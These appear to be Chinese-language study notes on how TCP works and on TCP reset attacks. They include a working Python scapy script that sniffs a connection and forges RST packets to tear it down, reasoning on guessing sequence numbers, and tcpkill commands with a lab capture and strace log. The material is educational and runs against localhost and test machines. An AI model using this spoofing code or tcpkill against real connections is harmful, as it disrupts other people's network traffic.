```table-of-contents
```
# 概述
在谈RST攻击前，必须先了解TCP：如何通过三次握手建立TCP连接、四次握手怎样把全双工的连接关闭掉、滑动窗口是怎么传输数据的、TCP的flag标志位里RST在哪些情况下出现。下面我会画一些尽量简化的图来表达清楚上述几点，之后再了解下RST攻击是怎么回事。
![](attachments/Pasted%20image%2020230927114023.png)
# 三次握手
下面我通过A向B建立TCP连接来说明三次握手怎么完成的。
![](attachments/Pasted%20image%2020230927114046.png)
为了能够说清楚下面的RST攻击，需要结合上图说说：SYN标志位、序号、滑动窗口大小。
- SYN标志位
建立连接的请求中，标志位SYN都要置为1，在这种请求中会告知MSS段大小，就是本机希望接收TCP包的最大大小。

- 序号
发送的数据TCP包都有一个序号。它是这么得来的：最初发送SYN时，有一个初始序号，根据RFC的定义，各个操作系统的实现都是与系统时间相关的。之后，序号的值会不断的增加，比如原来的序号是100，如果这个TCP包的数据有10个字节，那么下次的TCP包序号会变成110。
TCP 协议的通信双方， 都必须维护一个序列号（sequence numbers），对于客户端来说，它会使用服务端的序列号来将接收到的数据按照发送的顺序排列。
![](attachments/Pasted%20image%2020230927121035.png)

- 滑动窗口
滑动窗口用于加速传输，比如发了一个seq=100的包，理应收到这个包的确认ack=101后再继续发下一个包，但有了滑动窗口，只要新包的seq与没有得到确认的最小seq之差小于滑动窗口大小，就可以继续发。

滑动窗口毫无疑问是用来加速数据传输的。TCP要保证“可靠”，就需要对一个数据包进行ack确认表示接收端收到。
有了滑动窗口，接收端就可以等收到许多包后只发一个ack包，确认之前已经收到过的多个数据包。有了滑动窗口，发送端在发送完一个数据包后不用等待它的ack，在滑动窗口大小内可以继续发送其他数据包。

**注：如果谈到TCP攻击就需要注意，TCP的各种实现中，在滑动窗口之外的seq会被扔掉！下面会讲这个问题。**

TCP 滑动窗口大小是对网络中可能存在的未确认数据量的硬性限制。我们可以用它来计算发送方在某一特定时间内可能发送的最大序列号（`max_seq_no`）：
```bash
max_seq_no = max_acked_seq_no + window_size
```
其中 `max_acked_seq_no` 是接收方发送的最大 ACK 号，它表示发送方知道接收方已经成功接收的最大序列号。
window_size 是窗口大小，它表示允许发送方最多发送的未被确认的字节。
所以发送方可以发送的最大序列号是：`max_acked_seq_no + window_size`。


TCP 规范规定，接收方应该忽略任何序列号在接收窗口之外的数据。
例如，如果接收方确认了所有序列号在 `15,000` 以下的字节，且接收窗口大小为 `30,000`，那么接下来接收方只能接收序列号范围在 `15,000 ~ 45,000` 之间的数据。
如果一个报文段的部分数据在窗口内，另一部分数据在窗口外，那么窗口内的数据将被接收确认，窗口外的数据将被丢弃。**注意：这里忽略了SACK选择确认选项，再强调一遍！**

# 四次挥手
![](attachments/Pasted%20image%2020230927114316.png)
FIN标志位也看到了，它用来表示正常关闭连接。图的左边是主动关闭连接方，右边是被动关闭连接方，用netstat命令可以看到标出的连接状态。

FIN是正常关闭，它会根据缓冲区的顺序来发的，就是说缓冲区FIN之前的包都发出去后再发FIN包，这与RST不同。

# RST标志位
RST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。
**发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。**

TCP处理程序会在自己认为的异常时刻发送RST包。例如，A向B发起连接，但B之上并未监听相应的端口，这时B操作系统上的TCP处理程序会发RST包。

又比如，AB正常建立连接了，正在通讯时，A向B发送了FIN包要求关连接，B发送ACK后，网断了，A通过若干原因放弃了这个连接（例如进程重启）。网通了后，B又开始发数据包，A收到后不知道这野连接哪来的，就发了个RST包强制把连接关了，B收到后会出现connect reset by peer错误。

# RST攻击
A和服务器B之间建立了TCP连接，此时C伪造了一个TCP包发给B，使B异常的断开了与A之间的TCP连接，就是RST攻击了。实际上从上面RST标志位的功能已经可以看出这种攻击如何达到效果了。

- 那么伪造什么样的TCP包可以达成目的呢？
我们至顶向下的看。假定C伪装成A发过去的包：
	- 如果这个包是RST包的话，毫无疑问，B将会丢弃与A的缓冲区上所有数据，强制关掉连接。
	- 如果发过去的包是SYN包，那么，B会表示A已经发疯了（与OS的实现有关），正常连接时又来建新连接，B主动向A发个RST包，并在自己这端强制关掉连接。

这两种方式都能够达到复位攻击的效果。似乎挺恐怖，然而关键是，如何能伪造成A发给B的包呢？这里有两个关键因素，==**源端口和序列号**==。

一个TCP连接都是四元组，由源IP、源端口、目标IP、目标端口唯一确定一个连接。所以，如果C要伪造A发给B的包，要在上面提到的IP头和TCP头，把源IP、源端口、目标IP、目标端口都填对。
这里B作为服务器，IP和端口是公开的，A是我们要下手的目标，IP当然知道，但A的源端口就不清楚了，因为这可能是A随机生成的。当然，如果能够对常见的OS如windows和linux找出生成source port规律的话，还是可以搞定的。

![](attachments/Pasted%20image%2020230927120340.png)
**对于 TCP 重置报文段来说，接收方对序列号的要求更加严格，只有当其序列号正好等于下一个预期的序列号时才能接收**。
继续搬出上面的例子，接收方发送了一个确认应答，ACK 号为 `15,000`。如果接下来收到了一个重置报文，那么其序列号必须是 `15,000` 才能被接收。
- 如果重置报文的序列号超出了接收窗口范围，接收方就会直接忽略该报文；
- 如果其序列号在接收窗口范围内，那么接收方就会返回一个 `challenge ACK`，告诉发送方重置报文段的序列号是错误的，并告之正确的序列号，发送方可以利用 `challenge ACK` 中的信息来重新构建和发送重置报文。


## 暴力/盲目 TCP 重置攻击
如果攻击者能够截获通信双方正在交换的信息，攻击者就能读取其数据包上的序列号和确认应答号，并利用这些信息得出伪装的 TCP 重置报文段的序列号。
相反，如果无法截获通信双方的信息，就无法确定重置报文段的序列号，但仍然可以批量发出尽可能多不同序列号的重置报文，以期望猜对其中一个序列号。这就是所谓的盲目 TCP 重置攻击（`blind TCP reset attack`）。
在 2010 年之前 TCP 的原始版本中，攻击者只需要猜对接收窗口内的随便哪一个序列号即可，一般只需发送几万个报文段就能成功。采取额外限制的措施后，攻击者需要发送数以百万计的报文段才有可能猜对序列号，这几乎是很难成功的。更多细节请参考 [RFC-5963](https://tools.ietf.org/html/rfc5961)。

因为一个sequence长度是32位，取值范围0-4294967296，如果窗口大小像上图中我抓到的windows下的65535的话，只需要相除，就知道最多只需要发65537（4294967296/65535=65537）个包就能有一个序列号落到滑动窗口内。
RST包是很小的，IP头＋TCP头也才40字节，算算我们的带宽就知道这实在只需要几秒钟就能搞定。
那么，序列号不是问题，源端口会麻烦点，如果各个操作系统不能完全随机的生成源端口，或者黑客们能通过其他方式获取到source port，RST攻击易如反掌，后果很严重。

## 模拟攻击
现在来总结一下伪造一个 TCP 重置报文要做哪些事情：

- 嗅探通信双方的交换信息。
- 截获一个 `ACK` 标志位置位 1 的报文段，并读取其 `ACK` 号。
- 伪造一个 TCP 重置报文段（`RST` 标志位置为 1），其序列号等于上面截获的报文的 `ACK` 号。这只是理想情况下的方案，假设信息交换的速度不是很快。大多数情况下为了增加成功率，可以连续发送序列号不同的重置报文。
- 将伪造的重置报文发送给通信的一方或双方，时其中断连接。

为了实验简单，我们可以使用本地计算机通过 `localhost` 与自己通信，然后对自己进行 TCP 重置攻击。需要以下几个步骤：

1. 在两个终端之间建立一个 TCP 连接。
2. 编写一个能嗅探通信双方数据的攻击程序。
3. 修改攻击程序，伪造并发送重置报文。

### 建立 TCP 连接
可以使用 netcat 工具来建立 TCP 连接，这个工很多操作系统都预装了。打开第一个终端窗口，运行以下命令：
```c
$ nc -nvl 8000
```

这个命令会启动一个 TCP 服务，监听端口为 8000。接着再打开第二个终端窗口，运行以下命令：
```c
$ nc 127.0.0.1 8000
```

该命令会尝试与上面的服务建立连接，在其中一个窗口输入一些字符，就会通过 TCP 连接发送给另一个窗口并打印出来。
###  嗅探流量
编写一个攻击程序，使用 Python 网络库 `scapy` 来读取两个终端窗口之间交换的数据，并将其打印到终端上。完整的代码参考 [我的 GitHub 仓库](https://github.com/robert/how-does-a-tcp-reset-attack-work/blob/master/main.py)，代码的核心是调用 `scapy` 的嗅探方法：
```c
t = sniff(
        iface='lo0',
        lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip),
        prn=log_packet,
        count=50)

```
这段代码告诉 `scapy` 在 `lo0` 网络接口上嗅探数据包，并记录所有 TCP 连接的详细信息。

- **iface** : 告诉 scapy 在 `lo0`（localhost）网络接口上进行监听。
- **lfilter** : 这是个过滤器，告诉 scapy 忽略所有不属于指定的 TCP 连接（通信双方皆为 `localhost`，且端口号为 `8000`）的数据包。
- **prn** : scapy 通过这个函数来操作所有符合 `lfilter` 规则的数据包。上面的例子只是将数据包打印到终端，下文将会修改函数来伪造重置报文。
- **count** : scapy 函数返回之前需要嗅探的数据包数量。

```python
from scapy.all import *
import ifaddr
import threading
import random

DEFAULT_WINDOW_SIZE = 2052


# In order for this attack to work on Linux, we must
# use L3RawSocket, which under the hood sets up the socket
# to use the PF_INET "domain". This is required because of the
# way localhost works on Linux.
#
# See https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface for more details.
conf.L3socket = L3RawSocket

def log(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")

def is_adapter_localhost(adapter, localhost_ip):
    return len([ip for ip in adapter.ips if ip.ip == localhost_ip]) > 0

def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
    def f(p):
        return (
            is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or
            is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p)
        )

    return f


def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst

        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip

    return f


def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport

        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port

    return f


def send_reset(iface, seq_jitter=0, ignore_syn=True):
    """Set seq_jitter to be non-zero in order to prove to yourself that the
    sequence number of a RST segment does indeed need to be exactly equal
    to the last sequence number ACK-ed by the receiver"""
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
            }
        )

        if "S" in flags and ignore_syn:
            print("Packet has SYN flag, not sending RST")
            return

        # Don't allow a -ve seq
        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            print("jitter == 0, this RST packet should close the connection")

        rst_seq = ack + jitter
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log(
            "Sending RST packet...",
            {
                "orig_ack": ack,
                "jitter": jitter,
                "seq": rst_seq,    
            },
        )

        send(p, verbose=0, iface=iface)

    return f


def log_packet(p):
    """This prints a big pile of debug information. We could make a prettier
    log function if we wanted."""
    return p.show()


if __name__ == "__main__":
    localhost_ip = "127.0.0.1"
    local_ifaces = [
        adapter.name for adapter in ifaddr.get_adapters()
        if is_adapter_localhost(adapter, localhost_ip)
    ]

    iface = local_ifaces[0]

    localhost_server_port = 8000

    log("Starting sniff...")
    t = sniff(
        iface=iface,
        count=50,
        # NOTE: uncomment `send_reset` to run the reset attack instead of
        # simply logging the packet.
        # prn=send_reset(iface),
        prn=log_packet,
        lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))
    log("Finished sniffing!")
```
### 发送伪造的重置报文
发送伪造的 TCP 重置报文来进行 TCP 重置攻击。根据上面的解读，只需要修改 prn 函数就行了，让其检查数据包，提取必要参数，并利用这些参数来伪造 TCP 重置报文并发送。
例如，假设该程序截获了一个从（`src_ip`, `src_port`）发往 （`dst_ip`, `dst_port`）的报文段，该报文段的 ACK 标志位已置为 1，ACK 号为 `100,000`。攻击程序接下来要做的是：

- 由于伪造的数据包是对截获的数据包的响应，所以伪造数据包的源 `IP/Port` 应该是截获数据包的目的 `IP/Port`，反之亦然。
- 将伪造数据包的 `RST` 标志位置为 1，以表示这是一个重置报文。
- 将伪造数据包的序列号设置为截获数据包的 ACK 号，因为这是发送方期望收到的下一个序列号。
- 调用 `scapy` 的 `send` 方法，将伪造的数据包发送给截获数据包的发送方。

## 小结
一般情况下RST重置攻击只对长连接有杀伤力，对于短连接而言，你还没攻击呢，人家已经完成了信息交换。
从某种意义上来说，伪造 TCP 报文段是很容易的，因为 TCP/IP 都没有任何内置的方法来验证对端的身份。**有些特殊的 IP 扩展协议（例如 `IPSec`）确实可以验证身份，但并没有被广泛使用**。
服务器只能接收报文段，并在可能的情况下使用更高级别的协议（如 `TLS`）来验证对方的身份。但这个方法对 TCP 重置包并不适用，因为 TCP 重置包是 TCP 协议本身的一部分，无法使用更高级别的协议进行验证。

尽管伪造 TCP 报文段很容易，但伪造正确的 TCP 重置报文段并完成攻击却并不容易。构建伪造的重置包时需要选择一个序列号。接收方可以接收序列号不按顺序排列的报文段，但这种容忍是有限度的（序列号和接收端未被确认的序列号之差小于滑动窗口），如果报文段的序列号与它期望的相差甚远，就会被直接丢弃。

# 杀掉 TCP 连接的工具
## tcpkill杀死活跃的TCP连接
### 使用
- 安装
Centos 下安装 tcpkill 命令
```text
yum install epel-release -y
yum install dsniff -y
```
![](attachments/Pasted%20image%2020230927143821.png)

- 第一个参数 -i 指定网卡设备。
- 第二个参数指定“kill”的强制等级，越高越强，默认为3。实际上就是沿tcp连接窗口滑动而发送的tcp rst包个数。将这个参数设置较大主要是为了应对高速tcp连接的情况。
参数的大小从中断tcp连接的原理上没有区别，只是发送rst包数量的差异，通常情况下使用默认值3已经完全没有问题了。所以使用tcpkill时请不要像网络上某些中文教程中一样不适当的使用参数 -9 。
- 第三个参数则是匹配需要kill的tcp连接通配表达式，语法与tcpdump使用的pcap-filter完全一样。

如果我们需要使用tcpkill临时禁止服务器与主机10.0.0.1的tcp连接，可以在服务器上输入命令：
```c
# tcpkill -i any host 10.0.0.1

tcpkill会一直阻止主机10.0.0.1与服务器的网络连接，直到你结束这个tcpkill进程为止。
```
**注：运行tcpkill命令后并不会马上中断匹配的tcp连接，只有当该连接有新的tcp包发送接收时，tcpkill才会“kill”这个tcp连接。**
之所以tcpkill不会马上中断目标tcp连接，是因为伪造tcp rst包时，需要填入正确的sequence number，这需要通过拦截双方的tcp通信才能实时得到。
所以运行tcpkill后，只有目标连接有新tcp包发送/接受才会导致tcp连接中断。

### 实验


- 服务器
机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B
```text
nc -l 8080
```
- 服务器抓包
机器 c2 启动 tcpdump 抓包

```text
sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap
```
- 客户端
本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接

```text
nc c2 8080
```


在服务端 B 机器上可以看到这条 TCP 连接

```text
netstat -nat | grep -i 8080
tcp        0      0 10.211.55.10:8080       10.211.55.2:60086       ESTABLISHED
```

- 启动 tcpkill
在服务器上执行下面的命令。
```text
sudo tcpkill -i eth0 port 8080
```
注意这个时候 tcp 连接依旧安然无恙，并没有被杀掉。

在本地机器终端 nc 命令行中随便输入一点什么，这里输入`hello`，发现这时服务端和客户端的 nc 进程已经退出了。
下面来分析抓包文件：
![](attachments/Pasted%20image%2020230927122721.png)


### 原理
在服务器A上通过netstat查看活跃的TCP链接（活跃即存在数据包传输），然后通过
tcpkill 来杀死对应的连接。
PS：在机器A上执行tcpkill 其实是通过活跃包嗅探到seq，然后对端机器发送Reset包来结束对端的连接。同时，机器A上的连接也会被杀掉。
> 但是机器A上tcpdump好像是没抓到发给机器A的rst。
>猜测：这个应该是tcpkill基于活跃包来构造rst发给自身的，而tcpdump抓包比较考前，只能抓取到活跃的数据包以及往外发的rst。

可以看到，**tcpkill 假冒了 A 和 B 的 IP发送了 RST 包给通信的双方，那问题来了，伪造 ip 很简单，它是怎么知道当前会话的序列号的呢？**

TCP协议是通过FIN包与ACK包来做四次挥手，从而断开TCP连接的，这是正常的TCP断连过程，但TCP协议中还有RST包，这种包用于异常情况下断开连接，Linux在收到RST包后，会直接关闭本端的Socket连接，而不需要经历四次挥手过程。

而tcpkill命令，正是通过给对方发送RST包，从而实现杀死TCP连接的。但要发送一个正确的RST包，需要知道TCP连接交互时所使用的序列号(seq)，因为乱序的包会被TCP直接丢弃，所以tcpkill还会监听网卡上交互的包，以找到指定连接所使用的序列号seq。

**所以，tcpkill只能kill有流量的活跃TCP连接，对于空闲连接就无法处理了。
tcpkill 的原理跟 tcpdump 差不多（过滤规则类似tcpdump），会通过 libpcap 库抓取符合条件的包。 因此只有有数据传输的 tcp 连接它才可以拿到当前会话的序列号，通过这个序列号伪造 IP 发送符合条件的 RST 包。**

### 应用
通过tcpkill 可以杀死一条机器上的链接。

```c
server A 信息：192.21.7.1/24
server B 信息：192.21.5.10/24
```

server A上的操作：
```c

1》telnet serverB
# telnet 192.21.5.10 80
Trying 192.21.5.10...
Connected to 192.21.5.10.
Escape character is '^]'.
fwef
Connection closed by foreign host.

2> 抓包

```
![](attachments/Pasted%20image%2020231011162922.png)
由上所示，给连接的2端都发送了rst。

strace 查看详细：
依旧是serverA上telnet serverB 80, 此时serverA的端口是 41754。
![](attachments/Pasted%20image%2020231011164702.png)
```c
# netstat -apn |grep 192.21.5
tcp        0      0 192.21.7.1:41754        192.21.5.10:80          ESTABLISHED 31183/telnet

# strace -T -tt -f tcpkill -i eth03 'port 41754'
16:31:35.655333 execve("/sbin/tcpkill", ["tcpkill", "-i", "eth03", "port 41754"], [/* 43 vars */]) = 0 <0.000137>
16:31:35.655588 brk(NULL)               = 0x1ed0000 <0.000015>
16:31:35.655639 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19f9fca000 <0.000012>
16:31:35.655685 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory) <0.000025>
16:31:35.655743 open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000013>
16:31:35.655783 fstat(3, {st_mode=S_IFREG|0644, st_size=52132, ...}) = 0 <0.000011>
16:31:35.655832 mmap(NULL, 52132, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f19f9fbd000 <0.000013>
16:31:35.655876 close(3)                = 0 <0.000012>
16:31:35.655914 open("/lib64/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3 <0.000014>
16:31:35.655951 read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\3209\0\0\0\0\0\0"..., 832) = 832 <0.000012>
16:31:35.655986 fstat(3, {st_mode=S_IFREG|0755, st_size=111080, ...}) = 0 <0.000012>
16:31:35.656022 mmap(NULL, 2202264, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f19f9b90000 <0.000013>
16:31:35.656057 mprotect(0x7f19f9ba6000, 2097152, PROT_NONE) = 0 <0.000016>
16:31:35.656095 mmap(0x7f19f9da6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16000) = 0x7f19f9da6000 <0.000015>
16:31:35.656143 mmap(0x7f19f9da8000, 6808, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f19f9da8000 <0.000013>
16:31:35.656182 close(3)                = 0 <0.000012>
16:31:35.656220 open("/lib64/libnsl.so.1", O_RDONLY|O_CLOEXEC) = 3 <0.000013>
16:31:35.656255 read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240@\0\0\0\0\0\0"..., 832) = 832 <0.000012>
16:31:35.656290 fstat(3, {st_mode=S_IFREG|0755, st_size=113584, ...}) = 0 <0.000012>
16:31:35.656324 mmap(NULL, 2198200, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f19f9977000 <0.000013>
16:31:35.656360 mprotect(0x7f19f998d000, 2093056, PROT_NONE) = 0 <0.000014>
16:31:35.656395 mmap(0x7f19f9b8c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15000) = 0x7f19f9b8c000 <0.000013>
16:31:35.656433 mmap(0x7f19f9b8e000, 6840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f19f9b8e000 <0.000012>
16:31:35.656471 close(3)                = 0 <0.000011>
16:31:35.656506 open("/lib64/libpcap.so.1", O_RDONLY|O_CLOEXEC) = 3 <0.000013>
16:31:35.656543 read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P|\0\0\0\0\0\0"..., 832) = 832 <0.000012>
16:31:35.656577 fstat(3, {st_mode=S_IFREG|0755, st_size=266496, ...}) = 0 <0.000012>
16:31:35.656611 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19f9fbc000 <0.000011>
16:31:35.656647 mmap(NULL, 2360808, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f19f9736000 <0.000013>
16:31:35.656682 mprotect(0x7f19f9774000, 2093056, PROT_NONE) = 0 <0.000014>
16:31:35.656716 mmap(0x7f19f9973000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3d000) = 0x7f19f9973000 <0.000013>
16:31:35.656753 mmap(0x7f19f9976000, 1512, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f19f9976000 <0.000015>
16:31:35.656793 close(3)                = 0 <0.000014>
16:31:35.656835 open("/lib64/libnet.so.1", O_RDONLY|O_CLOEXEC) = 3 <0.000014>
16:31:35.656873 read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300@\0\0\0\0\0\0"..., 832) = 832 <0.000013>
16:31:35.656907 fstat(3, {st_mode=S_IFREG|0755, st_size=98736, ...}) = 0 <0.000012>
16:31:35.656941 mmap(NULL, 2201528, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f19f951c000 <0.000011>
16:31:35.656985 mprotect(0x7f19f9533000, 2093056, PROT_NONE) = 0 <0.000013>
16:31:35.657019 mmap(0x7f19f9732000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16000) = 0x7f19f9732000 <0.000013>
16:31:35.657057 mmap(0x7f19f9734000, 6072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f19f9734000 <0.000012>
16:31:35.657095 close(3)                = 0 <0.000011>
16:31:35.657137 open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000013>
16:31:35.657173 read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\20\35\2\0\0\0\0\0"..., 832) = 832 <0.000012>
16:31:35.657208 fstat(3, {st_mode=S_IFREG|0755, st_size=2127336, ...}) = 0 <0.000011>
16:31:35.657245 mmap(NULL, 3940800, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f19f9159000 <0.000013>
16:31:35.657279 mprotect(0x7f19f9311000, 2097152, PROT_NONE) = 0 <0.000015>
16:31:35.657315 mmap(0x7f19f9511000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b8000) = 0x7f19f9511000 <0.000013>
16:31:35.657352 mmap(0x7f19f9517000, 16832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f19f9517000 <0.000012>
16:31:35.657389 close(3)                = 0 <0.000012>
16:31:35.657431 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19f9fbb000 <0.000013>
16:31:35.657469 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19f9fb9000 <0.000032>
16:31:35.657526 arch_prctl(ARCH_SET_FS, 0x7f19f9fb9740) = 0 <0.000012>
16:31:35.657599 mprotect(0x7f19f9511000, 16384, PROT_READ) = 0 <0.000013>
16:31:35.657636 mprotect(0x7f19f9732000, 4096, PROT_READ) = 0 <0.000013>
16:31:35.657684 mprotect(0x7f19f9973000, 8192, PROT_READ) = 0 <0.000012>
16:31:35.657723 mprotect(0x7f19f9b8c000, 4096, PROT_READ) = 0 <0.000012>
16:31:35.657759 mprotect(0x7f19f9da6000, 4096, PROT_READ) = 0 <0.000013>
16:31:35.657795 mprotect(0x601000, 4096, PROT_READ) = 0 <0.000017>
16:31:35.657836 mprotect(0x7f19f9fcb000, 4096, PROT_READ) = 0 <0.000013>
16:31:35.657870 munmap(0x7f19f9fbd000, 52132) = 0 <0.000017>
16:31:35.657960 brk(NULL)               = 0x1ed0000 <0.000012>
16:31:35.657993 brk(0x1ef1000)          = 0x1ef1000 <0.000012>
16:31:35.658026 brk(NULL)               = 0x1ef1000 <0.000011>
16:31:35.658079 open("/proc/net/dev", O_RDONLY) = 3 <0.000025>
16:31:35.658129 fstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0 <0.000011>
16:31:35.658164 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19f9fc9000 <0.000012>
16:31:35.658198 read(3, "Inter-|   Receive               "..., 1024) = 1024 <0.000028>
16:31:35.658250 stat("/etc/sysconfig/64bit_strstr_via_64bit_strstr_sse2_unaligned", 0x7fff979dc380) = -1 ENOENT (No such file or directory) <0.000013>
16:31:35.658292 read(3, "    0    774044 3150247710597 95"..., 1024) = 216 <0.000014>
16:31:35.658332 close(3)                = 0 <0.000013>
16:31:35.658366 munmap(0x7f19f9fc9000, 4096) = 0 <0.000015>
16:31:35.658403 socket(AF_PACKET, SOCK_RAW, 768) = 3 <0.000022>
16:31:35.658450 ioctl(3, SIOCGIFINDEX, {ifr_name="lo", }) = 0 <0.000013>
16:31:35.658777 ioctl(3, SIOCGIFHWADDR, {ifr_name="eth03", ifr_hwaddr=e0:00:84:56:21:5f}) = 0 <0.000012>
16:31:35.658814 ioctl(3, SIOCGIFINDEX, {ifr_name="eth03", }) = 0 <0.000012>
16:31:35.658850 bind(3, {sa_family=AF_PACKET, proto=0x03, if6, pkttype=PACKET_HOST, addr(0)={0, }, 20) = 0 <0.012965>
16:31:35.671841 getsockopt(3, SOL_SOCKET, SO_ERROR, [0], [4]) = 0 <0.000008>
16:31:35.671874 setsockopt(3, SOL_PACKET, PACKET_ADD_MEMBERSHIP, {mr_ifindex=6, mr_type=PACKET_MR_PROMISC, mr_alen=0, mr_address=}, 16) = 0 <0.000042>
16:31:35.671941 setsockopt(3, SOL_PACKET, PACKET_AUXDATA, [1], 4) = 0 <0.000012>
16:31:35.671974 getsockopt(3, SOL_SOCKET, SO_BPF_EXTENSIONS, [64], [4]) = 0 <0.000010>
16:31:35.672016 getsockopt(3, SOL_PACKET, PACKET_HDRLEN, [32], [4]) = 0 <0.000012>
16:31:35.672049 setsockopt(3, SOL_PACKET, PACKET_VERSION, [1], 4) = 0 <0.000011>
16:31:35.672082 setsockopt(3, SOL_PACKET, PACKET_RESERVE, [4], 4) = 0 <0.000011>
16:31:35.672115 ioctl(3, SIOCGIFMTU, {ifr_name="eth03", ifr_mtu=1500}) = 0 <0.000011>
16:31:35.672150 ioctl(3, SIOCETHTOOL, 0x7fff979dc740) = 0 <0.000012>
16:31:35.672183 getsockopt(3, SOL_SOCKET, SO_TYPE, [3], [4]) = 0 <0.000011>
16:31:35.672217 getsockopt(3, SOL_PACKET, PACKET_RESERVE, [4], [4]) = 0 <0.000011>
16:31:35.672250 setsockopt(3, SOL_PACKET, PACKET_RX_RING, {block_size=4096, block_nr=520, frame_size=144, frame_nr=14560}, 16) = 0 <0.015570>
16:31:35.687846 mmap(NULL, 2129920, PROT_READ|PROT_WRITE, MAP_SHARED, 3, 0) = 0x7f19f8f51000 <0.000053>
16:31:35.688000 socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 4 <0.000015>
16:31:35.688036 ioctl(4, SIOCGIFADDR, {ifr_name="eth03", ifr_addr={AF_INET, inet_addr("192.21.7.1")}}) = 0 <0.000013>
16:31:35.688077 ioctl(4, SIOCGIFNETMASK, {ifr_name="eth03", ifr_netmask={AF_INET, inet_addr("255.255.255.0")}}) = 0 <0.000011>
16:31:35.688111 close(4)                = 0 <0.000014>
16:31:35.688189 brk(NULL)               = 0x1ef1000 <0.000011>
16:31:35.688219 brk(0x1f12000)          = 0x1f12000 <0.000012>
16:31:35.688287 brk(NULL)               = 0x1f12000 <0.000011>
16:31:35.688317 brk(NULL)               = 0x1f12000 <0.000011>
